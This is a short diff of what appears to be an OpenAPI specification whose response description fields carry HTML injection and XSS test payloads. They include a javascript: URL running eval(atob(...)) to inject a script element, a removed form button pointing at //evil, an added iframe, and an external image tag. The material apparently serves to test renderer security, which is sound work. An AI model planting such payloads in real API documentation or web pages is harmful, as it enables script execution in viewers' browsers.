@@ -74,7 +74,8 @@ a');location=`javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2Ny
                 ],
                 "responses": {
                     "200": {
-                        "description": "{<marquee>test</marquee><h1 style='border:2px solid Tomato;'>Hello World HTML injection PoC</h1><form><button formaction=//evil>XSS</button><textarea name=x>}"
+                        "description": "{<iframe src="https://www.w3schools.com" title="W3Schools Free Online Web Tutorials">
+</iframe>}"
                     },
                     "400": {
                         "description": "<IMG src='https://techbeacon.scdn7.secure.raxcdn.com/sites/default/files/styles/article_hero_image/public/field/image/testing-trends-world-quality-report.jpg?itok=vUyONZsj'/>
